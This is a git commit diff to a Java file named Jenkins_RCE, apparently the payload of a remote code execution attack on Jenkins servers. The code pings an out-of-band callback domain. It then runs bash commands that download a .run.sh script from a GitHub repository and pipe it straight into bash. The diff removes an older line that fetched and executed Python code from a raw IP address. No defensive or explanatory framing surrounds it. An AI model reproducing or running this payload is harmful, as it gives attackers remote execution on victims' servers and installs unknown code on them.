3eb65d4818ae92f3a1e8c0a43d98a6c060f1ce0e
anonymous <anonymous>
2019-02-21 17:58:09 +0800

    update

--- Jenkins_RCE.java
+++ Jenkins_RCE.java
@@ -3,8 +3,7 @@ public class Jenkins_RCE {
         try {
             java.lang.Runtime.getRuntime().exec("ping -c 1 jenkins.78kh7z.ceye.io");
             String[] cmd = new String[] {
-                // "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://118.24.115.224:8088/lufVxLu6i');exec(r.read());\"",
-                    "wget -q https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh || curl -fsSLO https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh | /bin/bash .run.sh" };
+                    "(wget -q -O - https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh | bash )||( curl -fsSL https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh | bash)" };
             for (String c : cmd) {
                 java.lang.Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", c });
             }
